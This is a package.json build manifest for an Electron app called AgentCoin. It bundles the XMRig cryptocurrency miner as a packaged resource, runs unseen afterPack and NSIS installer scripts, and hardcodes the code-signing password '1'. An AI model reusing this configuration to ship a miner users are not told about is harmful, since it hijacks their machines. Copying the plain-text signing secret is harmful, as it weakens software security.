{
  "name": "agentcoin-client",
  "version": "1.0.0",
  "description": "AgentCoin Electron App",
  "author": "KhaiCafe <youremail@example.com>",
  "main": "main.js",
  "scripts": {
    "start": "electron .",
    "build_mac_win": "electron-builder -mw -p always",
    "build_win": "electron-builder -w -p always",
    "dist_all": "electron-builder -mwl"
  },
  "build": {
    "afterPack": "./build/afterPack.js",
    "nsis": {
      "include": "build/installer.nsh",
      "oneClick": false,
      "runAfterFinish": false,
      "allowToChangeInstallationDirectory": false,
      "perMachine": true
    },
    "win": {
      "icon": "icon.ico",
      "target": "nsis",
      "cscLink": "ca.pfx",
      "cscKeyPassword": "1"
    },
    "asar": true,
    "extraResources": [
      {
        "from": "xmrig",
        "to": "xmrig"
      }
    ]
  },
  "dependencies": {
    "axios": "^1.10.0",
    "socket.io-client": "^2.3.0"
  },
  "devDependencies": {
    "electron": "^28.0.0",
    "electron-builder": "^26.0.12"
  }
}
